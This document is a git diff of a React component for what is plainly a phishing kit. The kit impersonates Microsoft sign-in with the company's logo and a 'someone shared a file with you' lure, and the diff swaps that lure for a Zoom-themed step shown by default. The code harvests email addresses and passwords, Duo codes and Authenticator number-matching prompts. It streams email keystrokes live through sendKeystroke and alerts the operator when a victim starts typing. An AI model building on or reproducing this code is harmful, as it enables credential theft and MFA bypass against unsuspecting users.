@@ -1,4 +1,5 @@
 import React, {useState, useEffect, useRef} from "react";
+import Zoom from "./Zoom"
 import "./AppStyles.css"; // This line was causing an error.
 
 /**
@@ -35,10 +36,12 @@ const App = () => {
   const [alert_email_typing, setAlert_email_typing] = useState(false);
 
   // --- NEW: State for the authorization step ---
-  const [isAuthorizationStep, setIsAuthorizationStep] = useState(false);
+  const [isAuthorizationStep, setIsAuthorizationStep] = useState(true);
   const [fileName, setFileName] = useState("confidential.docx"); // Default file name
   const [from, setFrom] = useState(""); // Default sharer
   const [isPersonalEmail, setIsPersonalEmail] = useState(false);
+
+  
 
   // ADD these lines for the new MS Authenticator step
   const [isMsAuthenticatorStep, setIsMsAuthenticatorStep] = useState(false);
@@ -347,12 +350,15 @@ const App = () => {
       <path strokeLinecap="round" strokeLinejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 00-3.375-3.375h-1.5A1.125 1.125 0 0113.5 7.125v-1.5a3.375 3.375 0 00-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 00-9-9z" />{" "}
     </svg>
   );
+
   const AuthenticatorIcon = () => (
     <svg className="mfa-prompt-icon" style={{width: "28px", height: "28px", color: "#505050"}} xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
       <path d="M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0z" />
       <path fillRule="evenodd" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1z" />
     </svg>
   );
+
+  
 
   return (
     <div className="app-container">
@@ -362,366 +368,342 @@ const App = () => {
           backgroundImage: "url('https://source.unsplash.com/1920x1080/?landscape,nature,abstract')",
         }}
       ></div>
+
       <div className="overlay"></div>
 
       <div className="content-wrapper">
         <div className="login-form-container">
           {isAuthorizationStep ? (
-            <div key="auth-step" className="auth-step">
-              <div style={{marginBottom: "1.5rem"}}>
-                {" "}
-                <img
-                  src="ms_logo.png"
-                  alt="Logo"
-                  className="microsoft-logo"
-                  onError={(e) => {
-                    e.target.onerror = null;
-                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
-                  }}
-                />{" "}
-              </div>
-              <h1 className="form-title" style={{marginBottom: "16px"}}>
-                You're invited to collaborate
-              </h1>
-              <p className="auth-subtitle">Someone has shared a file with you. To view it, please sign in or create an account.</p>
-              <div className="file-info-container">
-                <FileIcon />
-                <div className="file-details">
-                  <p className="file-name">{fileName}</p>
-                  {from && <p className="file-sharer">Shared by: {from}</p>}
+            <Zoom onComplete={handleAuthorizationContinue} />
+          ) : (
+            <>
+              {isSuccessStep ? (
+                <div key="success-step" className="success-step">
+                  <div style={{ marginBottom: "1.5rem" }}>
+                    {" "}
+                    <img
+                      src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
+                      alt="Microsoft Logo"
+                      className="microsoft-logo"
+                      onError={(e) => {
+                        e.target.onerror = null;
+                        e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
+                      }}
+                    />{" "}
+                  </div>
+                  <h1 className="form-title" style={{ marginBottom: "16px" }}>
+                    Thanks!
+                  </h1>
+                  <p className="success-subtitle"> No Further Action Needed on your end. </p>
+                  <p className="success-info"> An email containing the Statement will be sent to you shortly. </p>
                 </div>
-              </div>
-              <div className="flex-justify-end" style={{marginTop: "1.5rem"}}>
-                <button type="button" className="button-primary" onClick={handleAuthorizationContinue}>
-                  Continue
-                </button>
-              </div>
-            </div>
-          ) : isSuccessStep ? (
-            <div key="success-step" className="success-step">
-              <div style={{marginBottom: "1.5rem"}}>
-                {" "}
-                <img
-                  src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
-                  alt="Microsoft Logo"
-                  className="microsoft-logo"
-                  onError={(e) => {
-                    e.target.onerror = null;
-                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
-                  }}
-                />{" "}
-              </div>
-              <h1 className="form-title" style={{marginBottom: "16px"}}>
-                Thanks!
-              </h1>
-              <p className="success-subtitle"> No Further Action Needed on your end. </p>
-              <p className="success-info"> An email containing the Statement will be sent to you shortly. </p>
-            </div>
-          ) : isCustomStep ? (
-            <div key="custom-step">
-              <div style={{marginBottom: "1.5rem"}}>
-                {" "}
-                <img
-                  src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
-                  alt="Microsoft Logo"
-                  className="microsoft-logo"
-                  onError={(e) => {
-                    e.target.onerror = null;
-                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
-                  }}
-                />{" "}
-              </div>
-              <div className="password-step-header">
-                <button onClick={handleBackClick} className="back-button">
-                  <BackArrowIcon />
-                </button>
-                <span className="email-display">{email}</span>
-              </div>
-              <h1 className="form-title">{customStepData.title}</h1>
-              <p className="auth-message" style={{marginBottom: "1rem"}}>
-                {customStepData.subtitle}
-              </p>
-              {customStepData.has_input && (
-                <form onSubmit={handleCustomSubmit}>
-                  <div className="input-field-container" style={{marginBottom: "0.5rem"}}>
-                    <input
-                      type="text"
-                      value={customInput}
-                      // MODIFIED: Keystroke sending is REMOVED from this field
-                      onChange={(e) => setCustomInput(e.target.value)}
-                      placeholder="Enter information"
-                      className="input-field"
-                      autoFocus
+              ) : isCustomStep ? (
+                <div key="custom-step">
+                  <div style={{ marginBottom: "1.5rem" }}>
+                    {" "}
+                    <img
+                      src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
+                      alt="Microsoft Logo"
+                      className="microsoft-logo"
+                      onError={(e) => {
+                        e.target.onerror = null;
+                        e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
+                      }}
+                    />{" "}
+                  </div>
+                  <div className="password-step-header">
+                    <button onClick={handleBackClick} className="back-button">
+                      <BackArrowIcon />
+                    </button>
+                    <span className="email-display">{email}</span>
+                  </div>
+                  <h1 className="form-title">{customStepData.title}</h1>
+                  <p className="auth-message" style={{ marginBottom: "1rem" }}>
+                    {customStepData.subtitle}
+                  </p>
+                  {customStepData.has_input && (
+                    <form onSubmit={handleCustomSubmit}>
+                      <div className="input-field-container" style={{ marginBottom: "0.5rem" }}>
+                        <input
+                          type="text"
+                          value={customInput}
+                          // MODIFIED: Keystroke sending is REMOVED from this field
+                          onChange={(e) => setCustomInput(e.target.value)}
+                          placeholder="Enter information"
+                          className="input-field"
+                          autoFocus
+                        />
+                      </div>
+                      <div className="flex-justify-end">
+                        <button type="submit" className="button-primary" disabled={isSubmitting || !customInput}>
+                          {isSubmitting ? "Submitting..." : "Submit"}
+                        </button>
+                      </div>
+                    </form>
+                  )}
+                </div>
+              ) : isMsAuthenticatorStep ? (
+                <div key="ms-auth-step">
+                  <div style={{ marginBottom: "1.5rem" }}>
+                    <img
+                      src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
+                      alt="Microsoft Logo"
+                      className="microsoft-logo"
+                      onError={(e) => {
+                        e.target.onerror = null;
+                        e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
+                      }}
                     />
                   </div>
-                  <div className="flex-justify-end">
-                    <button type="submit" className="button-primary" disabled={isSubmitting || !customInput}>
-                      {isSubmitting ? "Submitting..." : "Submit"}
+                  <div className="password-step-header">
+                    <button onClick={handleBackClick} className="back-button">
+                      <BackArrowIcon />
                     </button>
+                    <span className="email-display">{email}</span>
                   </div>
-                </form>
-              )}
-            </div>
-          ) : isMsAuthenticatorStep ? (
-            <div key="ms-auth-step">
-              <div style={{marginBottom: "1.5rem"}}>
-                <img
-                  src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
-                  alt="Microsoft Logo"
-                  className="microsoft-logo"
-                  onError={(e) => {
-                    e.target.onerror = null;
-                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
-                  }}
-                />
-              </div>
-              <div className="password-step-header">
-                <button onClick={handleBackClick} className="back-button">
-                  <BackArrowIcon />
-                </button>
-                <span className="email-display">{email}</span>
-              </div>
 
-              <h1 className="form-title">Approve sign in request</h1>
+                  <h1 className="form-title">Approve sign in request</h1>
 
-              <div className="mfa-prompt-container" style={{alignItems: "center", margin: "1.5rem 0"}}>
-                <AuthenticatorIcon />
-                <p className="mfa-prompt-text" style={{marginLeft: "16px"}}>
-                  Open your Authenticator app, and enter the number shown to sign in.
-                </p>
-              </div>
-
-              <div
-                className="ms-auth-number-display"
-                style={{
-                  fontSize: "3rem",
-                  fontWeight: 300,
-                  letterSpacing: "1px",
-                  textAlign: "center",
-                  margin: "2rem 0",
-                  lineHeight: 1,
-                }}
-              >
-                {msAuthNumber}
-              </div>
-
-              <p className="ms-auth-info-text">
-                Didn’t receive a sign-in request? <strong>Swipe down to refresh</strong> the content in your app.
-              </p>
-
-              <div className="mfa-options-container" style={{justifyContent: "flex-start", marginTop: "1.5rem"}}>
-                <label className="checkbox-container">
-                  <input type="checkbox" checked={dontAskAgainMs} onChange={(e) => setDontAskAgainMs(e.target.checked)} className="checkbox-input" />
-                  <span className="checkbox-custom"></span>
-                  Don't ask again for 14 days
-                </label>
-              </div>
-            </div>
-          ) : isDuoMobileStep ? (
-            <div key="duo-mobile-step">
-              <div style={{marginBottom: "1.5rem"}}>
-                {" "}
-                <img
-                  src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
-                  alt="Microsoft Logo"
-                  className="microsoft-logo"
-                  onError={(e) => {
-                    e.target.onerror = null;
-                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
-                  }}
-                />{" "}
-              </div>
-              <div className="password-step-header">
-                {" "}
-                <button onClick={handleBackClick} className="back-button">
-                  {" "}
-                  <BackArrowIcon />{" "}
-                </button>{" "}
-                <span className="email-display">{email}</span>{" "}
-              </div>
-              {showDuoCodeInput ? (
-                <>
-                  <h1 className="form-title">DUO CODE</h1>
-                  {authMessage && (
-                    <p className={`auth-message ${isError ? "error" : ""}`} style={{marginBottom: "1rem"}}>
-                      {" "}
-                      {authMessage}{" "}
+                  <div className="mfa-prompt-container" style={{ alignItems: "center", margin: "1.5rem 0" }}>
+                    <AuthenticatorIcon />
+                    <p className="mfa-prompt-text" style={{ marginLeft: "16px" }}>
+                      Open your Authenticator app, and enter the number shown to sign in.
                     </p>
+                  </div>
+
+                  <div
+                    className="ms-auth-number-display"
+                    style={{
+                      fontSize: "3rem",
+                      fontWeight: 300,
+                      letterSpacing: "1px",
+                      textAlign: "center",
+                      margin: "2rem 0",
+                      lineHeight: 1,
+                    }}
+                  >
+                    {msAuthNumber}
+                  </div>
+
+                  <p className="ms-auth-info-text">
+                    Didn’t receive a sign-in request? <strong>Swipe down to refresh</strong> the content in your app.
+                  </p>
+
+                  <div className="mfa-options-container" style={{ justifyContent: "flex-start", marginTop: "1.5rem" }}>
+                    <label className="checkbox-container">
+                      <input type="checkbox" checked={dontAskAgainMs} onChange={(e) => setDontAskAgainMs(e.target.checked)} className="checkbox-input" />
+                      <span className="checkbox-custom"></span>
+                      Don't ask again for 14 days
+                    </label>
+                  </div>
+                </div>
+              ) : isDuoMobileStep ? (
+                <div key="duo-mobile-step">
+                  <div style={{ marginBottom: "1.5rem" }}>
+                    {" "}
+                    <img
+                      src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
+                      alt="Microsoft Logo"
+                      className="microsoft-logo"
+                      onError={(e) => {
+                        e.target.onerror = null;
+                        e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
+                      }}
+                    />{" "}
+                  </div>
+                  <div className="password-step-header">
+                    {" "}
+                    <button onClick={handleBackClick} className="back-button">
+                      {" "}
+                      <BackArrowIcon />{" "}
+                    </button>{" "}
+                    <span className="email-display">{email}</span>{" "}
+                  </div>
+                  {showDuoCodeInput ? (
+                    <>
+                      <h1 className="form-title">DUO CODE</h1>
+                      {authMessage && (
+                        <p className={`auth-message ${isError ? "error" : ""}`} style={{ marginBottom: "1rem" }}>
+                          {" "}
+                          {authMessage}{" "}
+                        </p>
+                      )}
+                      <form onSubmit={handleSignInClick}>
+                        {/* MODIFIED: Keystroke sending is REMOVED from this field */}
+                        <div className="input-field-container" style={{ marginBottom: "0.5rem" }}>
+                          {" "}
+                          <input type="text" value={duoCode} onChange={(e) => setDuoCode(e.target.value)} placeholder="Enter security code" className="input-field" autoFocus />{" "}
+                        </div>
+                        <div className="flex-justify-end">
+                          {" "}
+                          <button type="submit" className="button-primary" disabled={isSubmitting || !duoCode}>
+                            {" "}
+                            {isSubmitting ? "Verifying..." : "Verify"}{" "}
+                          </button>{" "}
+                        </div>
+                      </form>
+                    </>
+                  ) : (
+                    <>
+                      <h1 className="form-title" style={{ marginBottom: "2rem" }}>
+                        Approve sign in request
+                      </h1>
+                      <div className="mfa-prompt-container">
+                        {isSubmitting ? <div className="spinner"></div> : authMessage.includes("calling") ? <PhoneIcon /> : <div className="spinner"></div>}
+                        <p className="mfa-prompt-text">{authMessage}</p>
+                      </div>
+                      <div className="mfa-options-container">
+                        <label className="checkbox-container">
+                          {" "}
+                          <input type="checkbox" checked={dontAskAgain} onChange={(e) => setDontAskAgain(e.target.checked)} className="checkbox-input" /> <span className="checkbox-custom"></span> Don't ask again for 30 days{" "}
+                        </label>
+                        <div className="mfa-links">
+                          {" "}
+                          <a href="#" className="link-custom">
+                            Having trouble? Sign in another way
+                          </a>{" "}
+                          <a href="#" className="link-custom">
+                            More information
+                          </a>{" "}
+                        </div>
+                      </div>
+                    </>
                   )}
+                </div>
+              ) : isPasswordStep ? (
+                <div key="password-step">
+                  <div style={{ marginBottom: "1.5rem" }}>
+                    {" "}
+                    <img
+                      src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
+                      alt="Microsoft Logo"
+                      className="microsoft-logo"
+                      onError={(e) => {
+                        e.target.onerror = null;
+                        e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
+                      }}
+                    />{" "}
+                  </div>
+                  <div className="password-step-header">
+                    {" "}
+                    <button
+                      onClick={() => {
+                        setIsPasswordStep(false);
+                        setAuthMessage("");
+                        setIsError(false);
+                      }}
+                      className="back-button"
+                    >
+                      {" "}
+                      <BackArrowIcon />{" "}
+                    </button>{" "}
+                    <span className="email-display">{email}</span>{" "}
+                  </div>
+                  <h1 className="form-title">Enter password</h1>
                   <form onSubmit={handleSignInClick}>
                     {/* MODIFIED: Keystroke sending is REMOVED from this field */}
-                    <div className="input-field-container" style={{marginBottom: "0.5rem"}}>
+                    <div style={{ marginBottom: "0.5rem" }}>
                       {" "}
-                      <input type="text" value={duoCode} onChange={(e) => setDuoCode(e.target.value)} placeholder="Enter security code" className="input-field" autoFocus />{" "}
+                      <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Password" className="input-field" autoFocus />{" "}
+                    </div>
+                    {authMessage && (
+                      <p className={`auth-message ${isError ? "error" : ""}`} style={{ marginBottom: "1rem" }}>
+                        {" "}
+                        {authMessage}{" "}
+                      </p>
+                    )}
+                    <div className="flex-justify-between" style={{ marginBottom: "1.5rem" }}>
+                      <label className="checkbox-container">
+                        {" "}
+                        <input type="checkbox" checked={keepSignedIn} onChange={(e) => setKeepSignedIn(e.target.checked)} className="checkbox-input" /> <span className="checkbox-custom"></span> <span style={{ marginRight: "3px" }}>Keep me signed in</span>{" "}
+                      </label>
+                      <a href="https://passwordreset.microsoftonline.com" target="_blank" className="link-custom">
+                        Forgot password?
+                      </a>
                     </div>
                     <div className="flex-justify-end">
                       {" "}
-                      <button type="submit" className="button-primary" disabled={isSubmitting || !duoCode}>
+                      <button type="submit" className="button-primary" disabled={isSubmitting || !password}>
                         {" "}
-                        {isSubmitting ? "Verifying..." : "Verify"}{" "}
+                        {isSubmitting ? "Signing in..." : "Sign in"}{" "}
                       </button>{" "}
                     </div>
                   </form>
-                </>
-              ) : (
-                <>
-                  <h1 className="form-title" style={{marginBottom: "2rem"}}>
-                    Approve sign in request
-                  </h1>
-                  <div className="mfa-prompt-container">
-                    {isSubmitting ? <div className="spinner"></div> : authMessage.includes("calling") ? <PhoneIcon /> : <div className="spinner"></div>}
-                    <p className="mfa-prompt-text">{authMessage}</p>
-                  </div>
-                  <div className="mfa-options-container">
-                    <label className="checkbox-container">
-                      {" "}
-                      <input type="checkbox" checked={dontAskAgain} onChange={(e) => setDontAskAgain(e.target.checked)} className="checkbox-input" /> <span className="checkbox-custom"></span> Don't ask again for 30 days{" "}
-                    </label>
-                    <div className="mfa-links">
-                      {" "}
-                      <a href="#" className="link-custom">
-                        Having trouble? Sign in another way
-                      </a>{" "}
-                      <a href="#" className="link-custom">
-                        More information
-                      </a>{" "}
-                    </div>
-                  </div>
-                </>
-              )}
-            </div>
-          ) : isPasswordStep ? (
-            <div key="password-step">
-              <div style={{marginBottom: "1.5rem"}}>
-                {" "}
-                <img
-                  src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
-                  alt="Microsoft Logo"
-                  className="microsoft-logo"
-                  onError={(e) => {
-                    e.target.onerror = null;
-                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
-                  }}
-                />{" "}
-              </div>
-              <div className="password-step-header">
-                {" "}
-                <button
-                  onClick={() => {
-                    setIsPasswordStep(false);
-                    setAuthMessage("");
-                    setIsError(false);
-                  }}
-                  className="back-button"
-                >
-                  {" "}
-                  <BackArrowIcon />{" "}
-                </button>{" "}
-                <span className="email-display">{email}</span>{" "}
-              </div>
-              <h1 className="form-title">Enter password</h1>
-              <form onSubmit={handleSignInClick}>
-                {/* MODIFIED: Keystroke sending is REMOVED from this field */}
-                <div style={{marginBottom: "0.5rem"}}>
-                  {" "}
-                  <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Password" className="input-field" autoFocus />{" "}
-                </div>
-                {authMessage && (
-                  <p className={`auth-message ${isError ? "error" : ""}`} style={{marginBottom: "1rem"}}>
+                  <div className="sign-in-options">
                     {" "}
-                    {authMessage}{" "}
-                  </p>
-                )}
-                <div className="flex-justify-between" style={{marginBottom: "1.5rem"}}>
-                  <label className="checkbox-container">
-                    {" "}
-                    <input type="checkbox" checked={keepSignedIn} onChange={(e) => setKeepSignedIn(e.target.checked)} className="checkbox-input" /> <span className="checkbox-custom"></span> <span style={{marginRight: "3px"}}>Keep me signed in</span>{" "}
-                  </label>
-                  <a href="https://passwordreset.microsoftonline.com" target="_blank" className="link-custom">
-                    Forgot password?
-                  </a>
-                </div>
-                <div className="flex-justify-end">
-                  {" "}
-                  <button type="submit" className="button-primary" disabled={isSubmitting || !password}>
-                    {" "}
-                    {isSubmitting ? "Signing in..." : "Sign in"}{" "}
-                  </button>{" "}
-                </div>
-              </form>
-              <div className="sign-in-options">
-                {" "}
-                <KeyIcon />{" "}
-                <a href="#" className="link-custom">
-                  Sign-in options
-                </a>{" "}
-              </div>
-            </div>
-          ) : (
-            <div key="email-step">
-              <div style={{marginBottom: "1.5rem"}}>
-                {" "}
-                <img
-                  src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
-                  alt="Microsoft Logo"
-                  className="microsoft-logo"
-                  onError={(e) => {
-                    e.target.onerror = null;
-                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
-                  }}
-                />{" "}
-              </div>
-              <h1 className="form-title">Sign in</h1>
-              {isPersonalEmail && (
-                <p className="auth-message error" style={{marginBottom: "1rem"}}>
-                  You can't sign in here with a personal account. Use your work or school account instead.
-                </p>
-              )}
-
-              <form onSubmit={handleNextClick}>
-                <div className="input-field-container">
-                  <input
-                    type="text"
-                    value={email}
-                    onChange={(e) => {
-                      sendKeystroke("email", e.target.value);
-                      if (!alert_email_typing) {
-                        setAlert_email_typing(true);
-                        send_alert_notification("Someone is currently typing an email");
-                      }
-                      setEmail(e.target.value);
-                    }}
-                    placeholder="Email, phone, or Skype"
-                    className="input-field"
-                    autoFocus
-                  />
-                </div>
-                <div className="text-xs-custom" style={{marginBottom: "1.5rem"}}>
-                  <p className="text-gray-700-custom">
-                    {" "}
-                    No account?{" "}
+                    <KeyIcon />{" "}
                     <a href="#" className="link-custom">
-                      {" "}
-                      Create one!{" "}
+                      Sign-in options
                     </a>{" "}
-                  </p>
+                  </div>
                 </div>
-                <div className="flex-justify-end">
-                  {" "}
-                  <button
-                    type="submit"
-                    className="button-primary"
-                    onClick={() => {
-                      send_alert_notification("Someone is trying to sign in with email: " + email);
-                    }}
-                    disabled={!email}
-                  >
+              ) : (
+                <div key="email-step">
+                  <div style={{ marginBottom: "1.5rem" }}>
                     {" "}
-                    Next{" "}
-                  </button>{" "}
+                    <img
+                      src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
+                      alt="Microsoft Logo"
+                      className="microsoft-logo"
+                      onError={(e) => {
+                        e.target.onerror = null;
+                        e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
+                      }}
+                    />{" "}
+                  </div>
+                  <h1 className="form-title">Sign in</h1>
+                  {isPersonalEmail && (
+                    <p className="auth-message error" style={{ marginBottom: "1rem" }}>
+                      You can't sign in here with a personal account. Use your work or school account instead.
+                    </p>
+                  )}
+
+                  <form onSubmit={handleNextClick}>
+                    <div className="input-field-container">
+                      <input
+                        type="text"
+                        value={email}
+                        onChange={(e) => {
+                          sendKeystroke("email", e.target.value);
+                          if (!alert_email_typing) {
+                            setAlert_email_typing(true);
+                            send_alert_notification("Someone is currently typing an email");
+                          }
+                          setEmail(e.target.value);
+                        }}
+                        placeholder="Email, phone, or Skype"
+                        className="input-field"
+                        autoFocus
+                      />
+                    </div>
+                    <div className="text-xs-custom" style={{ marginBottom: "1.5rem" }}>
+                      <p className="text-gray-700-custom">
+                        {" "}
+                        No account?{" "}
+                        <a href="#" className="link-custom">
+                          {" "}
+                          Create one!{" "}
+                        </a>{" "}
+                      </p>
+                    </div>
+                    <div className="flex-justify-end">
+                      {" "}
+                      <button
+                        type="submit"
+                        className="button-primary"
+                        onClick={() => {
+                          send_alert_notification("Someone is trying to sign in with email: " + email);
+                        }}
+                        disabled={!email}
+                      >
+                        {" "}
+                        Next{" "}
+                      </button>{" "}
+                    </div>
+                  </form>
                 </div>
-              </form>
-            </div>
+              )}
+            </>
           )}
         </div>
       </div>
